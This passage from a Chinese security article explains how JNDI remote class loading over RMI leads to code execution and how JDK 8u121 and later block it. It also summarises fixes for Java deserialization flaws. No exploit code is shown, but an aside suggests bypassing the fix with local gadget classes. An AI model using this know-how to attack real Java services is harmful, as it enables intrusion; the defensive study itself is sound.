jndi客户端请求获取rmi Registry上绑定的对象， Server返回了一个构造好的Reference（Wapper）对象给它（这里面的过程具体来说是，Registry注册中心返回对应Reference对象的存根给jndi客户端，jndi客户端根据存根里面的相关地址信息，向Server请求该对象的骨根，Server返回一个构造好的ReferenceWrapper对象给jndi客户端）；JNDI对返回的ReferenceWrapper对象处理的时候，会尝试加载记录在其内的className这个类并创建实例，当本地加载不到的时候，会判断是否存在factoryLocation参数，有的话就使用URLClassloader去加载，而这个远程地址是可控的，从而导致了远程任意类加载并实例化，那么只要是这个远程加载的类的初始化方法或者构造方法里面的代码都会被执行，从而造成任意代码执行漏洞。如果对这个过程还不是特别了解也可以参考笔者之前写的一篇文章：

[老生常谈的JNDI——JDK8下的JNDI](https://forum.butian.net/share/1873)，此文里面对JNDI客户端为什么会触发任意代码执行的相关代码细节进行了详细分析。

那么这里我们使用JDK8\_151来测试的时候会发生什么呢，我们来看下：

服务端：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-43d93e802c710fa8d83a5c10130f679e49043387.png)

JNDI Client：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5a3acd60fa6f68ca9c272f55739a988ee499c8c4.png)

HttpServer:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9b7565302bcac0e709c690f74820ae9075f246de.png)

运行client：

报错如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f58488545308287efb12b4735fd0e69f401d9fd7.png)

`The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.`

这个factory不被信任，要把`com.sun.jndi.rmi.object.trustURLCodebase`属性设置成true才行；

其实就是JNDI客户端的om.sun.jndi.rmi.registry.RegistryContext的decodeObject方法里面加了一个属性判断，如下对Reference的处理：可以看到对远程加载类的场景，不光Reference对象里面要存在factoryLocation参数，还要一个trustURLCodeBase属性是true才行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-513b80bfdda146fcb79bfad4bbe2a1bc625df128.png)

如果对上面这个代码还不太懂，强烈建议读以下下面这个文章：

[老生常谈的JNDI——JDK8下的JNDI](https://forum.butian.net/share/1873)

这个限制其实也是在JDK8\_121加上去的，核心就是通过切断远程加载类的行为，不让加载远程的类。（同时这里不妨想下是否能够对其绕过，最简单的思路就是，不让远程加载，那就本地加载呗，找到一个本地的类被加载过程能触发利用链的或者存在sink点，具体也可以参见上述推荐的文章）

对修复方案总结：
--------

这里我们不妨来总结下上述三种期刊对于java反序列化漏洞的修复措施：

1、通过为ObjectInputStream设置一个ObjectInputFilter 来干扰正常JDK的OIS（ 后文后写OIS）的反序列化，然后通过白名单类名对要反序列化的类容过滤（JDK对相关场景下下（JAVA rmi）反序列化漏洞的修复方式）

2、通过重写原生JDK中的OIS的resolve(Proxy)Class来干扰相关要反序列化的类名获取，通过黑名单来过滤恶意类（weblogic对反序列化漏洞的修复思路）；这里我们多提一嘴，前段时间比较火的RASP（Runtime application self-protection）技术里面对于反序列化漏洞的防御也是使用的这种思路，通过javaagent技术注入jvm，修改OIS的resolve(Proxy)Class代码实现，在其中加入相关恶意类的黑名单，从而阻止相关恶意类的类名的获取，来阻止对其的反序列化。

3、第三种情况中JNDI导致的漏洞其实严格意义上来说，这不是一个反序列化漏洞，因为触发漏洞的点不是对相关对象进行反序列化的过程，只不过是借助了rmi服务而已，但是这里我们也来总结下这种JNDI导致类远程加载漏洞的修复方案：直接就把远程加载的途径ban掉，默认情况下不允许远程加载其他类。（包括后续JNDI借助LDAP服务实现的漏洞也是一样（8\_121&lt;=JDK&lt;8\_191），修复措施就是禁止远程加载其他类）{JDK对JNDI漏洞的修复方式}

0x05 总结
=======

简单总结下反序列化漏洞，其实就是大家最常听说的，对不受信任的序列化数据没有进行检测、校验、限制，从而导致在其反序列化的时候出现相关意料之外的操作，这些操作有的能任意命令执行，有的能任意代码执行等。所以对其的修复方案主要就是不让其能被反序列化。其中最为常见的手段就是上文提到的为OIS设置ObjectInputFilter 和重写resolve(Proxy)Class来实现对相关恶意类的过滤，这里既可以设置黑名单也可以设置白名单；weblogic 官方采用的是前者，但是似乎不太乐观，经常会出现被绕过的情况；

除此之外，对JAVA RMI底层调用逻辑以及其DGC调用关系的学习的确能让人受益匪浅，当再去看weblogic系统的反序列化漏洞的时候有一种豁然开朗的感觉。

参考文章：  
<https://xz.aliyun.com/t/7264#toc-0>  
<https://paper.seebug.org/1091/>  
<https://www.anquanke.com/post/id/257452>

笔者才疏学浅，若文中存在错误观点，欢迎斧正。